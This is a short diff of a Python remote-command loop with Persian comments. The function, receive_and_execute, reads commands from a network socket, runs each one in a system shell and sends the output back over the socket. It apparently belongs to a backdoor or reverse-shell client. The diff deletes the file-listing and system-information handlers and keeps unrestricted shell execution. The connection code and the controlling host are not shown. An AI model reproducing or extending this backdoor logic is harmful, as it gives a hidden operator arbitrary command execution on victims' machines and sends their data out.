@@ -33,24 +33,13 @@ def receive_and_execute(client_socket):
                 print("Exiting...")
                 break
 
-            # دستور 'list' برای لیست کردن فایل‌ها
-            elif command.lower() == 'list':
-                files = os.listdir('.')
-                client_socket.send(str(files).encode())
-
-            # دستور 'sysinfo' برای اطلاعات سیستم
-            elif command.lower() == 'sysinfo':
-                system_info = os.popen("systeminfo").read()
-                client_socket.send(system_info.encode())
-
             # اجرای دستور shell
-            else:
-                try:
-                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                    client_socket.send(output)
-                except subprocess.CalledProcessError as e:
-                    error_message = f"Error executing command: {e.output.decode('utf-8')}"
-                    client_socket.send(error_message.encode())
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                client_socket.send(output)
+            except subprocess.CalledProcessError as e:
+                error_message = f"Error executing command: {e.output.decode('utf-8')}"
+                client_socket.send(error_message.encode())
         except Exception as e:
             print(f"Error while receiving/executing command: {e}")
             break
